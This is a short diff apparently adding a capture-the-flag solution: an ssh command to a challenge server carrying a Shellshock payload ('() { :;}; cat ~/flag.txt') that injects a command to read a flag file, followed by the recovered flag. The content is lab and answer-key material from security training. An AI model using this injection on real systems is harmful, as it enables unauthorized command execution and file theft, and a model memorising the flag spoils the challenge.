@@ -1,0 +1,2 @@
+ssh -p 2022 ctf@vuln2015.icec.tf () { :;}; cat ~/flag.txt
+The flag is: shocking_the_shellz_is_fun
